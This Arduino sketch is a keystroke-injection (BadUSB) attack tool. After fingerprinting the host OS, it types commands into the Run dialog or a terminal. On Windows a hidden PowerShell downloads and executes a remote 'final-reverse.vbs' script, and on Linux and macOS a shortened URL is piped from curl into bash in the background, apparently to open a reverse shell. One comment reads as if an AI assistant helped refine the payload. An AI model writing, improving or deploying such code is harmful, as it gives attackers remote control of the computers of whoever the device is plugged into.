#include <Arduino.h>
#include <FingerprintUSBHost.h>
#include <Keyboard.h>

String osGuess = "Unknown";

// Helper to ensure every character is registered
void slowPrint(const char* text) {
  for (int i = 0; text[i] != '\0'; i++) {
    Keyboard.write(text[i]);
    delay(25); // 25ms is the "sweet spot" for most OS buffers
  }
}

void setup() {
  Serial.begin(9600);
  delay(3000); // Give USB handshake time to finish
  FingerprintUSBHost.guessHostOS(osGuess);
  
  Keyboard.begin();
  delay(500);

  if (osGuess == "Windows") {
    // USE RUN DIALOG - it's more reliable than CMD
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(200);
    Keyboard.releaseAll();
    delay(1000); // Wait for Run box

    // This types the command directly into the Run box
    slowPrint("powershell -w h -c \"iwr 'https://raw.githubusercontent.com/sazid570/payload-ducky/refs/heads/main/final-reverse.vbs' -OutFile $env:TEMP\\r.vbs; & wscript $env:TEMP\\r.vbs\"");
    
    delay(200);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

  } else if (osGuess == "Linux") {
    // Try both common shortcuts
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press('t');

    delay(100);

    Keyboard.releaseAll();
    delay(1000);
    
    slowPrint("(nohup curl -fsSL https://tinyurl.com/570linux | bash > /dev/null 2>&1 &) && exit");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
  }
  else if (osGuess == "macOS" )
  {
          // 1. Open Spotlight Search (Cmd + Space)
      Keyboard.press(KEY_LEFT_GUI); // GUI is the Command key on Mac
      Keyboard.press(' ');
      delay(100);
      Keyboard.releaseAll();
      delay(500);

      // 2. Type "terminal" and hit Enter
      Keyboard.print("terminal");
      delay(200);
      Keyboard.press(KEY_RETURN);
      Keyboard.releaseAll();
      delay(1500); // Wait for Terminal to initialize

      // 3. Execute the payload
      // macOS uses zsh by default, but the bash command will still work.
      // I've kept your nohup logic for background execution.
      slowPrint("(curl -fsSL https://tinyurl.com/570linux | bash > /dev/null 2>&1 &) && exit");
      Keyboard.press(KEY_RETURN);
      Keyboard.releaseAll();
  }
  

  Keyboard.end();
}

void loop() {}